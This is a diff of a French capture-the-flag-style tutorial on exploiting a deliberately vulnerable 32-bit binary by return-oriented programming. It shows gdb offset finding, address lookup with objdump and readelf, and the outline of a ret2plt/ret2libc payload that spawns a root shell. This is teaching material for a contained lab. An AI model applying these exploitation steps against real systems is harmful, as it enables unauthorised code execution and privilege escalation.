@@ -11,7 +11,7 @@ docker run -it pingouin/roptuto
 
 ## Présentation
 
-Nous avons le code C où nous avons laissez une faille béante.
+Nous avons le code C où nous avons laissé une faille béante.
 
 ```c
 #include <stdlib.h>
@@ -29,20 +29,23 @@ int main(int argc, char **argv)
 }
 ```
 
-Dans la fonction input() la fonction scanf() ne vérifie pas si l'entrée de l'input est bien de 106 charactères. Ce qui expose notre programme a une  [BOF](https://fr.wikipedia.org/wiki/D%C3%A9passement_de_tampon).
+Dans la fonction input() la fonction scanf() ne vérifie pas si l'entrée de l'input est bien de 106 charactères. Ce qui expose notre programme à une  [BOF](https://fr.wikipedia.org/wiki/D%C3%A9passement_de_tampon).
 
 Dans le docker vous aurez un binaire à exploiter `rop` dans le répertoire `/root/`. Afin de faire cela vous aurez deux fichier python:
 
 * [part1.py](./exercices/part1.py)
 * [part2.py](./exercices/part2.py)
 
-Qui sereont à modifier avec différentes addresses mémoire que nous trouverons ensemble. Attention les addresses mémoires afficher dans se tutoriel sont mauvaise !
+Qui seront à modifier avec différentes adresses mémoire que nous trouverons ensemble. 
+**Attention les adresses mémoires affichées dans ce tutoriel sont fausses et sont là à titre d'exemple !**
+La forme d'une adresse mémoire est 0x*******.
 
 ## Analyse du binaire
 
-Nous faisons face à un executable 32bits compiler grâce a la commande `gcc rop.c -fno-stack-protector -no-pie -m32 -o rop`. Dans la fonction `input()` le developpeur ne vérifie pas si la taille entrer par l'utilisateur est bien de 94 charactères. Pour exploiter cette faille nous devons d'abord savoir quand nous prenons contrôle du flux d'execution. Pour cela nous envoyons une `unique string` dans notre programme et on regarde a quelle moment nous écrasons le registre `EIP`.
+Nous faisons face à un executable 32bits compilé grâce a la commande `gcc rop.c -fno-stack-protector -no-pie -m32 -o rop`. Dans la fonction `input()` le developpeur ne vérifie pas si la taille entrée par l'utilisateur n'excède pas 106 charactères. Pour exploiter cette faille, nous devons d'abord savoir quand nous prenons contrôle du flux d'execution. Pour cela nous envoyons une `unique string` dans notre programme et on regarde a quelle moment nous écrasons le registre `EIP`.
 
-Pour cela nous pouvous trouver une [unique string](https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html) et lancer notre executable `rop` dans un debugger. Nous avons `gdb` sur notre machine utilisons le:
+Pour cela nous pouvous trouver une [unique string avec ce lien](https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html) et lancer notre executable `rop` dans un debugger. 
+Nous avons `gdb` sur notre machine utilisons le:
 
 ```raw
 root@5859be6f9e32:~# gdb rop
@@ -84,7 +87,7 @@ Stopped reason: SIGSEGV
 EIP: 0x64413564 ('d5Ad')
 ```
 
-La ligne qui nous intéresse est `EIP: 0x64413564 ('d5Ad')` sur le site où nous avons crée notre unique string nous pouvons calculer l'offset et trouver a partir de quelle moment nous prenons contrôle du registre EIP.
+La ligne qui nous intéresse est `EIP: 0x64413564 ('d5Ad')`. Sur le site où nous avons créé notre unique string nous pouvons calculer l'offset et trouver à partir de quel moment nous prenons contrôle du registre EIP.
 
 ![offset](./offset.png)
 
@@ -92,21 +95,21 @@ Nous avons donc un offset de 106.
 
 ### ROP
 
-Le ROP (return object programming) nous permet deux choses. Contourner la protection de pile non executable et la protection ASLR du système qui permet la répartition aléatoire des adresses mémoire a chaque lancement de l'éxécutable.
+Le ROP (return object programming) nous permet deux choses. Contourner la protection de pile non executable ainsi que la protection ASLR du système qui permet la répartition aléatoire des adresses mémoire à chaque lancement de l'éxécutable.
 La méthode du ROP que nous allons utiliser est la plus classique et se divise en 3 partie :
-* ret2plt qui permet de récupérer l'addresse de la libc (dont la base est aléatoire via l'ASLR)
-* ret2main qui permet de retouner au début du program sans relancer l'executable et donc ne pas relancer l'ASLR.
-* ret2libc qui permet de lancer n'importe quelle fonction présente dans la libc ici nous utiliseront system.
+* ret2plt qui permet de récupérer l'adresse de la libc (dont la base est aléatoire via l'ASLR)
+* ret2main qui permet de retourner au début du programme sans relancer l'executable et donc ne pas relancer l'ASLR.
+* ret2libc qui permet de lancer n'importe quelle fonction présente dans la libc (ici nous utiliseront system).
 
 Mais du coup c'est quoi ret2XXX ?
 
 `ret2` est l'abréviation de `return to`.
 
-`plt` est l'abréviation de Procedure Linkage Table qui est, en termes simples, utilisé pour appeler des procédures/fonctions externes dont l'adresse n'est pas connue au moment de la liaison, et est laissé à la résolution par l'éditeur de liens dynamique lors de l'exécution.
+`plt` est l'abréviation de Procedure Linkage Table qui est, en termes simples, on s'en sert pour appeler des procédures/fonctions externes dont l'adresse n'est pas connue au moment de la liaison, et est laissé à la résolution par l'éditeur de liens dynamique lors de l'exécution.
 
 `main` est la fonction principale de notre exécutable c'est par elle que commence et fini notre exécutable.
 
-`libc` est l'implementation standard des fonction C comme **strcopy** ou **system**.
+`libc` est l'implémentation standard des fonction C comme **strcopy** ou **system**.
 
 `got` signifie Global Offsets Table et est également utilisée pour résoudre les adresses.
 
@@ -115,11 +118,11 @@ Pour plus d'information sur la `plt` et la `got` [ici](https://www.technovelty.o
 Pour nous aider a contrôler notre programme nous allons utiliser des ROP Gadgets ce sont de petites séquences d'instructions se terminant par une instruction "ret" ("\xc3").
 
 Dans un premier temps nous avons besoins de trouver les adresses mémoire de :
-*  main
+* main
 * puts@plt
 * scanf
 
-Avec objdump nous pouvons lister toutes les méthodes importé dans le binaire via la `plt`:
+Avec objdump nous pouvons lister toutes les méthodes importées dans le binaire via la `plt`:
 ```
 root@10b97ae13330:~# objdump -R rop
 
@@ -133,13 +136,13 @@ OFFSET   TYPE              VALUE
 0884cf14 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7
 ```
 
-Nous avons l'addresse de la fonction `scanf` via la ligne
+Nous avons l'adresse de la fonction `scanf` via la ligne
 
 ```
 0884cf14 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7
 ```
 
-Nous pouvons avoir l'addresse de puts :
+Nous pouvons avoir l'adresse de puts :
 ```
 root@10b97ae13330:~# objdump -d rop | grep "<puts@plt>"
 08849f30 <puts@plt>:
@@ -149,7 +152,7 @@ root@10b97ae13330:~# objdump -d rop | grep "<puts@plt>"
 08849f30 <puts@plt>:
 ```
 
-Nous avons donc les addresses de :
+Nous avons donc les adresses de :
 
 * `puts@plt`: 0x08849f30
 * `__isoc99_scanf@GLIBC_2.7`: 0x0884cf14
@@ -190,7 +193,7 @@ Nous avons donc deux choix:
 * 0x09849243 : `pop ebp ; ret`
 * 0x09849241 : `pop ebx ; ret`
 
-Enfin nous devons trouver l'addresse du main de l'executable. Avec gdb nous pouvons avoir désassembler le main de notre programme:
+Enfin nous devons trouver l'adresse du main de l'executable. Avec gdb nous pouvons avoir désassembler le main de notre programme:
 
 ```raw
 root@5859be6f9e32:~# gdb rop
@@ -211,7 +214,7 @@ End of assembler dump.
 0x089491b1 <+0>:	push   ebp
 ```
 
-Nous avons donc l'addresse du main: `0x089491b1`.
+Nous avons donc l'adresse du main: `0x089491b1`.
 
 Pour récapituler nous avons :
 * `main` 0x089491b1 
@@ -224,9 +227,10 @@ Pour récapituler nous avons :
 Notre premier payload va donc être :
 `payload = addrPLTputs + addrPopEbxRet + addrGOTscanf + addrMain`
 
-Avec tout ça nous pouvons complèter [part1.py](./exercices/part1.py)
+Avec tout ça nous pouvons compléter [part1.py](./exercices/part1.py)
+Vous pouvez utiliser **vim** ou **nano** pour éditer le fichier.
 
-Quand vous le lancez vous devriez avoir une sortie de la sorte
+Quand vous le lancez avec `python part1.py` vous devriez avoir une sortie qui ressemble à cela
 ```
 root@9e139f0c7ef4:~# python part1.py 
 [*] '/root/rop'
@@ -249,13 +253,14 @@ root@9e139f0c7ef4:~# python part1.py
 Input:
 [*] Stopped process './rop' (pid 32)
 ```
+Si ce n'est pas le cas, c'est qu'une des adresses entrée dans le fichier python est invalide.
 
 ### Création du shell
 
-Maintenant que nous avons fait fuiter l'addresse mémoire de la fonction scanf de la libc nous devons trouver l'addresse de cette même fonction scanf mais dans la libc afin de calculer l'écart et avoir l'addresse de base de la libc afin d'appeller n'importe quelle autre fonction.
-Afin de trouver c'est addresses nous pouvons utiliser strings, objdump et/ou readelf.
+Maintenant que nous avons fait fuiter l'adresse mémoire de la fonction scanf de la libc nous devons trouver l'adresse de cette même fonction scanf mais dans la libc afin de calculer l'écart et avoir l'adresse de base de la libc afin d'appeller n'importe quelle autre fonction.S
+Afin de trouver ces adresses nous pouvons utiliser strings, objdump et/ou readelf.
 
-Pour trouver l'addresses de `scanf` dans la libc:
+Pour trouver l'adresse de `scanf` dans la libc:
 ```
 root@566553ec2fbd:~# objdump -d /lib32/libc.so.6 | grep isoc99_scanf
 00076480 <__isoc99_scanf@@GLIBC_2.7>:
@@ -273,7 +278,7 @@ root@566553ec2fbd:~# objdump -d /lib32/libc.so.6 | grep isoc99_scanf
 00076480 <__isoc99_scanf@@GLIBC_2.7>:
 ```
 
-Pour trouver l'addresse de `system` dans la libc:
+Pour trouver l'adresse de `system` dans la libc:
 ```
 root@566553ec2fbd:~# readelf -s /lib32/libc.so.6 | grep system        
    257: 0012a2c0   102 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
@@ -285,7 +290,7 @@ root@566553ec2fbd:~# readelf -s /lib32/libc.so.6 | grep system
 ```
 
 
-Pour trouver l'addresse de la string `/bin/sh` dans la libc:
+Pour trouver l'adresse de la string `/bin/sh` dans la libc:
 ```
 root@566553ec2fbd:~# strings -a -t x /lib32/libc.so.6 | grep /bin/sh
  18ebbb /bin/sh
@@ -296,14 +301,16 @@ Nous avons donc:
 * `system@@GLIBC_2.0`:  0x000feae0 
 * `/bin/sh`: 0x0018ebbb 
 
-Pour trouver la base de la libc on fait la différence entre la fuite du scanf qu'on a eu dans la première partie et l'addresse de scanf trouver dans la libc.
-On peut maintenant ajouter a cette différence l'addresse de la fonction system ou l'addresse de la string “/bin/sh” afin d'y accèder avec notre payload.
+Pour trouver la base de la libc on fait la différence entre la fuite du scanf obtenue dans la première partie et l'adresse de scanf trouvée dans la libc.
+On peut ensuite ajouter à cette différence l'adresse de la fonction system ou l'adresse de la string “/bin/sh” afin d'y accéder avec notre payload.
 
 La fonction system dans la libc prend un argument :
 ```c
 int system(const char *command);
 ```
 
-Nous avons besoins d'utiliter un des gadgets précèdemment trouver afin de donner a system notre string `/bin/sh`.
+Nous avons besoin d'utiliser l'adresse d'un des deux gadgets précédemment obtenu afin de donner à `system()` notre string `/bin/sh`.
 
 A vous de modifier l'exploit [part2](./exercices/part2.py) !
+
+Lors de l'éxecution vous devriez obtenir un nouveau prompt, vous pourrez vérifier que vous avez réussi à passer root avec la command `id`.
